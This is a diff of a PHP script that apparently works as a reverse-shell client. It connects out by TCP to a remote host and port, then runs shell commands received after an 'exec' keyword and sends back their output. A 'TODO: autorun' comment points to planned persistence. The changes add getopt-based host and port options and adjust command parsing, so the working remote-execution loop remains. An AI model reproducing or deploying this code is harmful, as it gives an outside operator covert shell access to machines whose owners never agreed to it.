@@ -1,4 +1,4 @@
-#!/usr/local/bin/php -q
+#!/usr/bin/php -q
 <?php
 
 	// TODO: autorun
@@ -7,12 +7,20 @@
 	set_time_limit(0);
 	ob_implicit_flush(1);
 
-	if($argc< 3){
+	$short = "h:p:";
+	$long  = array(
+		"host:",
+		"port:"
+	);
+	$opts  = getopt($short,$long);
+
+
+	if(count($opts) < 2){
 		die("Assign remote addr. and port..\n");
 	}
 
-	$addr 	= trim($argv[1]);
-	$port 	= trim($argv[2]);
+	$addr 	= array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
+	$port 	= array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
 
 	if (($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
 	     die("\33[91m[!] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\33[0m\n");
@@ -42,6 +50,7 @@
 	    	if(preg_match('/^(exec)\s/', $recv, $matches, PREG_OFFSET_CAPTURE))
 	    	{
     			$full_cmd = "{ ".preg_replace('/(;)+(\s)*/', ';', trim(substr($recv, 4)));
+				$full_cmd = preg_replace("(exec)", "", $full_cmd);
 				$full_cmd .= substr($full_cmd, -1) !== ';' ? "; } 2>&1;" : " } 2>&1;";
 
 				if(!($result = shell_exec($full_cmd)))
